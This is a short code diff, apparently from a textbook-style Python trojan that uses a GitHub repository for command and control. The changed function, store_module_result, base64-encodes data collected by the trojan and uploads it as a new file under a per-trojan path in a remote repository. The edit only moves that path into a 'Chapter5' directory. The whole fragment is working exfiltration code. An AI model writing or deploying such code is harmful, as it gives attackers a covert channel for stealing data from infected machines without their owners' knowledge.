@@ -73,7 +73,7 @@ def store_module_result(data):
 
     gh, repo, branch = connect_to_github()
 
-    remote_path = 'data/%s/%d.data' % (trojan_id, random.randint(1000, 100000))
+    remote_path = 'Chapter5/data/%s/%d.data' % (trojan_id, random.randint(1000, 100000))
     repo.create_file(remote_path, 'Confirmation message', base64.b64encode(data.encode()))
 
     return
